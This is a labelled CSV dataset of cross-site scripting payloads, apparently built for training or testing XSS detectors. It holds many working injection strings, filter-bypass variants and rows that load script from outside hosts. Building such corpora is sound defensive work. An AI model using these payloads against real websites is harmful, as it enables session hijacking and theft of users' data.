payload,context,technique,severity,length
"<section onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</section>",tag_injection,none,medium,72
<a href=javas%26#99;ript:prompt%26#x28document.domain)>xss,dom_sink,url_encoding,low,58
"<kbd onmousemove=""alert(1)"">AnonKryptiQuz</kbd>",tag_injection,none,medium,47
<option onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</option>,tag_injection,none,medium,78
<details/open/ontoggle=(confirm)()//,tag_injection,none,low,36
"<b ondblclick=""alert(1)"">AnonKryptiQuz</b>",tag_injection,none,medium,42
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><datalist id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></datalist>",tag_injection,none,medium,186
"<article onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</article>",tag_injection,none,medium,75
"<element oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</element>",tag_injection,none,medium,77
"<nextid onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</nextid>",tag_injection,none,medium,87
"<div draggable=""true"" contenteditable>drag me</div><html ondrop=alert(1) contenteditable style=display:block>drop here</html>",tag_injection,none,medium,125
<script>alert(/AnonKryptiQuz/)</script>,script_injection,none,medium,39
"<script onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</script>",script_injection,none,medium,73
"<style>:target {color: red;}</style><command id=x style=""transition:color 10s"" ontransitioncancel=print()></command>",tag_injection,none,low,116
"<ol draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</ol>",tag_injection,none,medium,77
"<audio onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</audio>",tag_injection,none,medium,70
<small onpointerout=alert(1) style=display:block>AnonKryptiQuz</small>,tag_injection,none,medium,70
&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;,generic,none,low,64
<hgroup onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56
"<script a=`>` SRC=""http://www.securitycompass.com/xss.js""></script>",script_injection,none,low,67
<xss onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54
"<style>@keyframes x{}</style><audio2 style=""animation-name:x"" onwebkitanimationend=""alert(1)""></audio2>",tag_injection,none,medium,103
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><iframe2 id=x style=""position:absolute;"" onanimationcancel=""print()""></iframe2>",tag_injection,none,low,183
"<div id=""40""><style><img src=""</style><img src=x onerror=alert(40)//"">//[""'`-->]]>]</div>",tag_injection,none,medium,89
search?q=<img/src/onerror=alert(`AnonKryptiQuz`)>,tag_injection,none,medium,49
<bleh/ondragstart=&Tab;parent&Tab;['open']&Tab;&lpar;&rpar;%20draggable=True>dragme,tag_injection,url_encoding,low,83
'te' == alert('==') == 'xt';,attribute_escape,none,medium,28
<img src @error=e=$event.composedPath().pop().alert(1)>,generic,none,medium,55
"<event-source src=""%(event)s"" onload=""javascript:alert(1364)"">",js_uri,none,medium,62
<button onpointerenter=alert(1) style=display:block>AnonKryptiQuz</button>,tag_injection,none,medium,74
"<nobr onmousedown=""alert(1)"">AnonKryptiQuz</nobr>",tag_injection,none,medium,49
"javascript:\\\\\\\/\\\\\\\/\\\\\\\'\\\\\\\/<\\\\\\\/title><\\\\\\\/style><\\\\\\\/textarea><\\\\\\\/script>--><p%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B\\\\\\\'%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+\\\\\\\'Audi%20RS5\\\\\\\'.substr(0,4)}}XXX%3Cscript%3Ealert(\\\\\\\'AnonKryptiQuz\\\\\\\')",template_injection,url_encoding,medium,413
"<style>:target {color:red;}</style><header id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></header>",tag_injection,none,medium,116
"<canvas onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</canvas>",tag_injection,none,medium,72
/%09/javascript:alert(1);,js_uri,url_encoding,medium,25
"<object draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</object>",tag_injection,none,medium,90
&#X0003C;,generic,html_entity,low,9
<legend id=x tabindex=1 onfocus=alert(1)></legend>,tag_injection,none,medium,50
"<strong ondblclick=""alert(1)"">AnonKryptiQuz</strong>",tag_injection,none,medium,52
"""><svg onload=alert()>",tag_injection,none,medium,22
"""><img src=x onerror=prompt(unescape('document%2Edomain'));>",tag_injection,url_encoding,medium,60
onx+%00+onpointerenter%3dalert(domain)+x,generic,url_encoding,medium,40
"?callback=javascript:alert(1)"",",js_uri,none,medium,31
"<samp onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</samp>",tag_injection,none,medium,67
<iframe srcdoc='&lt;body onload=prompt&lpar;1411&rpar;&gt;'>,tag_injection,none,low,60
"<kbd onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</kbd>",tag_injection,none,medium,61
<java contentEditable='' autofocus='' onfocus=location=tagName+innerHTML+location.hash>script:/*#*/alert(1),dom_sink,comment_injection,high,107
"<dl oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,95
<track contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,59
"*{color:red}</style>//[""'`-->]]>]</div>",generic,none,low,39
<svg on onload=(alert)(document.domain)>,dom_sink,none,low,40
<embed onpointermove=alert(1) style=display:block>AnonKryptiQuz</embed>,tag_injection,none,medium,71
"<td onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</td>",tag_injection,none,medium,64
{{_openBlock.constructor('alert(1)')()}},template_injection,none,medium,40
"<xmp draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</xmp>",tag_injection,none,medium,83
<input oninput=alert(1) value=xss>,tag_injection,none,medium,34
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ruby id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></ruby>",tag_injection,none,medium,178
"<style>:target {color:red;}</style><shadow id=x style=""transition:color 1s"" ontransitionend=alert(1)></shadow>",tag_injection,none,medium,110
<x onxxx=alert(1) 1=',tag_injection,none,medium,21
<strong onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</strong><input value=clickme>,tag_injection,none,medium,103
<img src/onerror=alert(1)>,tag_injection,none,medium,26
<caption onpointerenter=alert(1) style=display:block>AnonKryptiQuz</caption>,tag_injection,none,medium,76
"<param onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</param>",tag_injection,none,medium,68
<svg contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,57
"<div draggable=""true"" contenteditable>drag me</div><spacer ondragover=alert(1) contenteditable>drop here</spacer>",tag_injection,none,medium,113
<blink onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56
"<style>:target {color: red;}</style><abbr id=x style=""transition:color 10s"" ontransitioncancel=print()></abbr>",tag_injection,none,low,110
"<style>@keyframes x{}</style><s style=""animation-name:x"" onanimationend=""alert(1)""></s>",tag_injection,none,medium,87
<figure id=x tabindex=1 onactivate=alert(1)></figure>,tag_injection,none,medium,53
"<center onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</center>",tag_injection,none,medium,68
"<image draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</image>",tag_injection,none,medium,88
<;IFRAME SRC=http://ha.ckers.org/scriptlet.html <;,generic,none,low,50
"<sup id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></sup>",tag_injection,none,medium,82
"<details onmousemove=""alert(1)"">AnonKryptiQuz</details>",tag_injection,none,medium,55
<input autofocus onblur=alert(1)>,tag_injection,none,medium,33
"<section draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</section>",tag_injection,none,medium,87
"<BGSOUND SRC=""javascript:alert('XSS');"">",js_uri,case_variation,medium,40
"<big onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</big>",tag_injection,none,medium,67
"<div onmouseleave=""alert(1)"">AnonKryptiQuz</div>",tag_injection,none,medium,48
<li onpointerup=alert(1) style=display:block>AnonKryptiQuz</li>,tag_injection,none,medium,63
"<audio onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</audio>",tag_injection,none,medium,71
"""'><img src=xxx:x \x22onerror=javascript:alert(6701)>",js_uri,none,medium,53
<link onpointerleave=alert(1) style=display:block>AnonKryptiQuz</link>,tag_injection,none,medium,70
"<details onmouseover=""alert(1)"">AnonKryptiQuz</details>",tag_injection,none,medium,55
"<style>@keyframes x{}</style><rt style=""animation-name:x"" onwebkitanimationend=""alert(1)""></rt>",tag_injection,none,medium,95
"<base onmousemove=""alert(1)"">AnonKryptiQuz</base>",tag_injection,none,medium,49
<center onpointerout=alert(1) style=display:block>AnonKryptiQuz</center>,tag_injection,none,medium,72
<button popovertarget=x>Click me</button><output ontoggle=alert(1) popover id=x>AnonKryptiQuz</output>,tag_injection,none,medium,102
"<div draggable=""true"" contenteditable>drag me</div><content ondragover=alert(1) contenteditable>drop here</content>",tag_injection,none,medium,115
<svg><set onend=alert(1) attributename=x dur=1s>,tag_injection,none,medium,48
<isindex action=javascript:alert(1) type=image>,js_uri,none,medium,47
"<rp oncontextmenu=""alert(1)"">AnonKryptiQuz</rp>",tag_injection,none,medium,47
"""><img src=x onerror=alert('AnonKryptiQuz');>",tag_injection,none,medium,45
"<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(41)></div>//[""'`-->]]>]</div>",tag_injection,url_encoding,medium,114
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",dom_sink,case_variation,high,60
"<spacer draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</spacer>",tag_injection,none,medium,90
'; x=eval; </script> <svg onpointerenter=alert()%20z= alert >,tag_injection,url_encoding,medium,61
"<style>@keyframes slidein {}</style><rb style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rb>",tag_injection,none,medium,158
<input3 onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56
"<area onclick=""alert(1)"">AnonKryptiQuz</area>",tag_injection,none,medium,45
<ol onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</ol>,tag_injection,none,medium,70
"<object oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,99
{{_Vue.h.constructor`alert(1)`()}},template_injection,none,medium,34
"<sup onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</sup>",tag_injection,none,medium,65
"<sup onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</sup>",tag_injection,none,medium,64
"<dt draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</dt>",tag_injection,none,medium,77
"<div draggable=""true"" contenteditable>drag me</div><template ondragover=alert(1) contenteditable>drop here</template>",tag_injection,none,medium,117
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",tag_injection,encoding|case_variation,high,69
"jane('""><script>alert(2)</script>)@gmail.com",script_injection,none,medium,44
"<div draggable=""true"" contenteditable>drag me</div><hgroup ondrop=alert(1) contenteditable style=display:block>drop here</hgroup>",tag_injection,none,medium,129
"<colgroup onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</colgroup>",tag_injection,none,medium,69
"&lt;BGSOUND SRC=\""javascript&#058;alert('AnonKryptiQuz');\""&gt;",generic,html_entity,medium,63
"<import namespace=""t"" implementation=""#default#time2"">",attribute_escape,none,low,54
&#60;body onload=alert('AnonKryptiQuz')&#62;&#34;&#34;,event_handler,html_entity,medium,54
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><option id=x style=""position:absolute;"" onanimationcancel=""print()""></option>",tag_injection,none,low,181
"<time ondblclick=""alert(1)"">AnonKryptiQuz</time>",tag_injection,none,medium,48
"<style>:target {transform: rotate(180deg);}</style><meter id=x style=""transition:transform 2s"" ontransitionrun=print()></meter>",tag_injection,none,low,127
"<cite onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</cite>",tag_injection,none,medium,61
"String.raw`jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`;",js_uri,comment_injection|url_encoding|case_variation,medium,157
"<style>:target {color:red;}</style><iframe id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></iframe>",tag_injection,none,medium,116
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><small id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></small>",tag_injection,none,medium,180
<embed code=javascript:javascript:alert(1);></embed>,js_uri,none,medium,52
"<b onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</b>",tag_injection,none,medium,63
"<style>@keyframes slidein {}</style><hgroup style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></hgroup>",tag_injection,none,medium,172
"<svg onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</svg>",tag_injection,none,medium,79
</script><body/onload=alert(m3ez)>,tag_injection,none,medium,34
"<cite onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</cite>",tag_injection,none,medium,84
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dd id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dd>",tag_injection,none,medium,174
"<video2 onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</video2>",tag_injection,none,medium,73
"<acronym onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</acronym>",tag_injection,none,medium,73
"<template draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</template>",tag_injection,none,medium,69
"<optgroup draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</optgroup>",tag_injection,none,medium,94
<summary id=x tabindex=1 ondeactivate=alert(1)></summary><input id=y autofocus>,tag_injection,none,medium,79
"<style>@keyframes x{}</style><tbody style=""animation-name:x"" onanimationstart=""alert(1)""></tbody>",tag_injection,none,medium,97
<svgonload=alert(1)>,tag_injection,none,medium,24
onMouseOver,generic,none,low,11
<image2 onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,68
"<keygen onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</keygen>",tag_injection,none,medium,85
"""'`><\x3Cimg src=xxx:x onerror=javascript:alert(0895)>",js_uri,none,medium,54
"<kbd onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</kbd>",tag_injection,none,medium,62
"<figure onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</figure>",tag_injection,none,medium,73
"<menu onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</menu>",tag_injection,none,medium,69
"<content draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</content>",tag_injection,none,medium,72
<table onpointerenter=alert(1) style=display:block>AnonKryptiQuz</table>,tag_injection,none,medium,72
<IMG SRC=�jav&#x09;ascript:alert(�AnonKryptiQuz�);�>,generic,html_entity|whitespace_obfuscation|case_variation,medium,52
"<style>:target {transform: rotate(180deg);}</style><aside id=x style=""transition:transform 2s"" ontransitionrun=print()></aside>",tag_injection,none,low,127
"<style>:target {color: red;}</style><h1 id=x style=""transition:color 10s"" ontransitioncancel=print()></h1>",tag_injection,none,low,106
"window.name=""<img src=x onerror=alert(23)>""",dom_sink,none,medium,43
<script onpointerenter=alert(1) style=display:block>AnonKryptiQuz</script>,script_injection,none,medium,74
"<img \x00src=x onerror=""javascript:alert(5023)"">",js_uri,none,medium,48
"<link ondblclick=""alert(1)"">AnonKryptiQuz</link>",tag_injection,none,medium,48
<Svg Only=1 OnLoad=confirm(document.domain)>,dom_sink,case_variation,medium,44
